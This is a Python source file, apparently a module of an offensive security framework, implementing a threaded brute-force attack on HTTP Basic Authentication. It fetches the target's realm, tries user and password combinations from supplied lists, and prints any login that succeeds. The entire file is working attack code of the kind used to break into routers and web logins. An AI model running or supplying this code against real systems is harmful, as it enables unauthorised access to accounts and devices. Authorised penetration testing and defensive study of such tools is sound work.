from jframework.modules.login._bruteforce import _Bruteforce
import urllib.request as ur
import http.client


class Httpbruteforce(_Bruteforce):

    def __init__(self):
        super(Httpbruteforce, self).__init__()
        self.realm_router = None
        self.find = False

    def get_realm(self):
        try:
            conn = http.client.HTTPConnection(self.HOST)
            conn.request("GET", "/")
            res = conn.getresponse()
            realm = res.getheader("WWW-Authenticate").split("=")[1].strip("\"")
            return realm
        except Exception as e:
            if("refused" in str(e)):
                return "refused"
            return None

    def worker(self, user, password):
        try:
            auth_handler = ur.HTTPBasicAuthHandler()
            auth_handler.add_password(realm=self.realm_router,
                                      uri=self.HOST,
                                      user=user,
                                      passwd=password)
            opener = ur.build_opener(auth_handler)
            ur.install_opener(opener)
            pag = ur.urlopen("http://" + str(self.HOST))
            if (pag.getcode() == 200):
                print("[+] Login found: " + str(user) + ":" + str(password))
                self.find = True
        except:
            if (self.verb):
                print("[-] " + str(user) + ":" + str(password) + " >> failed")
        self.num_threads -= 1

    def run(self, list_sessions):

        self.realm_router = self.get_realm()

        if self.realm_router is None:
            print("No realm found")
            return

        if(self.realm_router == "refused"):
            print("Connection refused")
            return

        super(Httpbruteforce, self).run(list_sessions)

        if not self.find:
            print("Login not found.")

        self.find = False
